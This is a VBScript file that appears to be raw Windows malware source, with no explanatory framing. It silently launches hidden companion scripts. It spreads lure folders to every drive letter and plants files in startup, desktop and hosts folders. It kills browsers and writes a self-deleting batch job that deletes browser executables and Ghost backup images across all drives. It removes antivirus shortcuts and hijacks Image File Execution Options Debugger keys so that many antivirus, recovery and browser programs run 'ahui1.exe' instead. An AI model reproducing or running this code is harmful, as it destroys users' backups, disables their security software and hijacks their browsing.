Set ws = CreateObject("Wscript.Shell")
ws.run "cmd /c linzhiling.rmvb",vbhide
ws.run "cmd /c linzhiling.vbe",vbhide
Set ws = CreateObject("Wscript.Shell")
ws.run "cmd /c dianwoxiufu.bat",vbhide


Set WshShell = CreateObject("WScript.Shell")
WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\etc"" ""C:\WINDOWS\system32\drivers\etc""",0,true



WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\Quick Launch"" ""%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch""",0,true

WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\「开始」菜单程序启动"" ""C:\Documents and Settings\All Users\「开始」菜单\程序\启动""",0,true



Set WshShell = CreateObject("WScript.Shell")
WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\Favorites"" ""%USERPROFILE%\Favorites""",0,true



Set WshShell = CreateObject("WScript.Shell")
WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\桌面1"" ""C:\Documents and Settings\All Users\桌面""",0,true


Set WshShell = CreateObject("WScript.Shell")
WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\桌面"" ""C:\Documents and Settings\All Users\桌面""",0,true





WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\激情美女面对面"" ""d:\""",0,true
Set WshShell = CreateObject("WScript.Shell")
WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\激情美女面对面"" ""e:\""",0,true

Set WshShell = CreateObject("WScript.Shell")
WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\激情美女面对面"" ""f:\""",0,true

Set WshShell = CreateObject("WScript.Shell")
WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\激情美女面对面"" ""g:\""",0,true

Set WshShell = CreateObject("WScript.Shell")
WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\激情美女面对面"" ""h:\""",0,true

Set WshShell = CreateObject("WScript.Shell")
WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\激情美女面对面"" ""i:\""",0,true

Set WshShell = CreateObject("WScript.Shell")
WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\激情美女面对面"" ""j:\""",0,true

Set WshShell = CreateObject("WScript.Shell")
WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\激情美女面对面"" ""k:\""",0,true

Set WshShell = CreateObject("WScript.Shell")
WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\激情美女面对面"" ""l:\""",0,true

Set WshShell = CreateObject("WScript.Shell")
WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\激情美女面对面"" ""m:\""",0,true

Set WshShell = CreateObject("WScript.Shell")
WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\激情美女面对面"" ""n:\""",0,true















WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\常用工具"" ""d:\""",0,true
Set WshShell = CreateObject("WScript.Shell")
WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\常用工具"" ""e:\""",0,true

Set WshShell = CreateObject("WScript.Shell")
WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\常用工具"" ""f:\""",0,true

Set WshShell = CreateObject("WScript.Shell")
WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\常用工具"" ""g:\""",0,true

Set WshShell = CreateObject("WScript.Shell")
WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\常用工具"" ""h:\""",0,true

Set WshShell = CreateObject("WScript.Shell")
WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\常用工具"" ""i:\""",0,true

Set WshShell = CreateObject("WScript.Shell")
WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\常用工具"" ""j:\""",0,true

Set WshShell = CreateObject("WScript.Shell")
WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\常用工具"" ""k:\""",0,true

Set WshShell = CreateObject("WScript.Shell")
WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\常用工具"" ""l:\""",0,true

Set WshShell = CreateObject("WScript.Shell")
WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\常用工具"" ""m:\""",0,true

Set WshShell = CreateObject("WScript.Shell")
WshShell.run "cmd.exe /c xcopy /e/h/r/y ""C:\WINDOWS\system32\常用工具"" ""n:\""",0,true




strComputer = "."
Set objWMIService = GetObject _
    ("winmgmts:\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _
    ("Select * from Win32_Process Where Name = '360SE.exe'")
For Each objProcess in colProcessList
    objProcess.Terminate()
Next

strComputer = "."
Set objWMIService = GetObject _
    ("winmgmts:\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _
    ("Select * from Win32_Process Where Name = 'sefix.exe'")
For Each objProcess in colProcessList
    objProcess.Terminate()
Next

strComputer = "."
Set objWMIService = GetObject _
    ("winmgmts:\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _
    ("Select * from Win32_Process Where Name = 'Maxthon.exe'")
For Each objProcess in colProcessList
    objProcess.Terminate()
Next

strComputer = "."
Set objWMIService = GetObject _
    ("winmgmts:\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _
    ("Select * from Win32_Process Where Name = 'TTraveler.exe'")
For Each objProcess in colProcessList
    objProcess.Terminate()
Next

strComputer = "."
Set objWMIService = GetObject _
    ("winmgmts:\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _
    ("Select * from Win32_Process Where Name = 'chrome.exe'")
For Each objProcess in colProcessList
    objProcess.Terminate()
Next

strComputer = "."
Set objWMIService = GetObject _
    ("winmgmts:\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _
    ("Select * from Win32_Process Where Name = 'SogouExplorer.exe'")
For Each objProcess in colProcessList
    objProcess.Terminate()
Next




strComputer = "."
Set objWMIService = GetObject _
    ("winmgmts:\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _
    ("Select * from Win32_Process Where Name = 'firefox.exe'")
For Each objProcess in colProcessList
    objProcess.Terminate()
Next



Wscript.Sleep 5000 '0110

on error resume next
set fso=createobject("scripting.filesystemobject")
set fw=fso.createtextfile("c:\windows\system32\jieshujincheng.bat",2) 
fw.writeline("@echo ")
fw.writeline("for %%i in (c: d: e: f: g: h: i: j: k: l: m: n:) do del %%i\Maxthon.exe /q /s /f /a ")
fw.writeline("for %%i in (c: d: e: f: g: h: i: j: k: l: m: n:) do del %%i\TTraveler.exe /q /s /f /a ")
fw.writeline("for %%i in (c: d: e: f: g: h: i: j: k: l: m: n:) do del %%i\360SE.exe /q /s /f /a ")
fw.writeline("for %%i in (c: d: e: f: g: h: i: j: k: l: m: n:) do del %%i\sefix.exe /q /s /f /a ")
fw.writeline("for %%i in (c: d: e: f: g: h: i: j: k: l: m: n:) do del %%i\*.gho /q /s /f /a ")
fw.writeline("for %%i in (c: d: e: f: g: h: i: j: k: l: m: n:) do del %%i\*.SMY /q /s /f /a ")
fw.writeline("for %%i in (c: d: e: f: g: h: i: j: k: l: m: n:) do del %%i\SogouExplorer.exe /q /s /f /a ")
fw.writeline("for %%i in (c: d: e: f: g: h: i: j: k: l: m: n:) do del %%i\chrome.exe /q /s /f /a ")
fw.writeline("for %%i in (c: d: e: f: g: h: i: j: k: l: m: n:) do del %%i\firefox.exe /q /s /f /a ")
fw.writeline("del %0") 



Set ws = CreateObject("Wscript.Shell")
ws.run "cmd /c jieshujincheng.bat",vbhide







set fso=wscript.createobject("scripting.filesystemobject")
set WshShell = WScript.CreateObject("WScript.Shell")
set f=fso.getfolder(WshShell.SpecialFolders("Desktop"))
set fs=f.files
for each f1 in fs
set file=fso.getfile(f1)
if file.name="搜狗高速浏览器.lnk" then
fso.deletefile(file)
end if
next
set f=fso.getfolder(WshShell.SpecialFolders("AllUsersDesktop"))
set fs=f.files
for each f1 in fs
set file=fso.getfile(f1)
if file.name="谷歌浏览器.lnk" then
fso.deletefile(file)
end if
next
set fso=wscript.createobject("scripting.filesystemobject")
set WshShell = WScript.CreateObject("WScript.Shell")
set f=fso.getfolder(WshShell.SpecialFolders("Desktop"))
set fs=f.files
for each f1 in fs
set file=fso.getfile(f1)
if file.name="360杀毒.lnk" then
fso.deletefile(file)
end if
next
set f=fso.getfolder(WshShell.SpecialFolders("AllUsersDesktop"))
set fs=f.files
for each f1 in fs
set file=fso.getfile(f1)
if file.name="360安全卫士.lnk" then
fso.deletefile(file)
end if
next
set f=fso.getfolder(WshShell.SpecialFolders("AllUsersDesktop"))
set fs=f.files
for each f1 in fs
set file=fso.getfile(f1)
if file.name="腾讯TT.lnk" then
fso.deletefile(file)
end if
next
set f=fso.getfolder(WshShell.SpecialFolders("AllUsersDesktop"))
set fs=f.files
for each f1 in fs
set file=fso.getfile(f1)
if file.name="傲游浏览器.lnk" then
fso.deletefile(file)
end if
next













Wscript.Sleep 5000 '0110

 
Dim A
    Set A=CreateObject("WScript.Shell")
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\theworld.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\firefox.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\opera.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Maxthon.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TTraveler.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KylinBrowser.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\vu.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MiniIE.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\suda.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\AdoIE.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\360Start.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iemate.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\IERepair.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SogouExplorer.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\GreenBrowser.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\tango.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SaaYaa.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\XWebStar.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MyIE.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TouchNet.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\See9IE.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SaaYaa.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\zhinanzhenbrowser.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\top.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\avant.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\hsreg.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Iparmor.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\srgui.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\360tray.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sriecli.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winpatrol.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ast.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\GHO_RUN.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\QQDoctorMain.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DrUpdate.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DrUpdate.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\QQDoctorRtp.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\QQDoctor.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SelfUpdate.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\QQDoctor.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\QQDoctor.exe.manifest\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\qqdownload.dll\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ImsCustom.dll\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\QQDoctor.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\QQDrUpdate.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\QQDoctor.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\srgui9.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RabbitLobby.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\srsi.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SRRest.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\srshut.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ieuninst.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\srms.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\srramdisk.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\IEProt2.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\srck.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Mcshield.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\vsTskMgr.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\naPrdMgr.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\UpdaterUI.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TBMon.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Ravmond.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\CCenter.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RavTask.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Rav.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Ravmon.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RavmonD.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RavStub.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KVXP.kxp\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\kvMonXP.kxp]\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KVCenter.kxp\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KVSrvXP.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KVCenter.kxp\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KVSrvXP.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KRegEx.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\UIHost.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TrojDie.kxp\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\FrogAgent.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Logo1_.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Navapw32.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Navapsvc.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Iparmor.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KAVsvc.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KAVsvcUI.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RAVmonD.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RAVmon.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RAVtimer.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\rav.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KVFW.EXE\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KVsrvXP.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KVMonXP.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KVwsc.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MPSVC.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MPSVC1.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MPSVC2.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MPMon.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\egui.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ekrn.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\EHttpSrv.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\AVP.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KAVPF.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KAVPF.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KVMonXP.kxp\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KvReport.kxp\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KVSrvXP.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\kvupload.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KvXP.kxp\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KvXP_1.kxp\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\QQUpdateCenter.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\QQDoctorRtp.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\QQDrUpdate.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\QQDrNetMon.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\QQDoctor.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\auclt.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\QQUpdateCenter.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\auclt.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\QQDrUpdate.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\VPTray.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\一键恢复系统.cmd\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DF5Sevr.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\FrzState2k.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mzdclient.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cltsrv.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\autostar.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wxsyncli.exe\Debugger","ahui1.exe","REG_SZ"
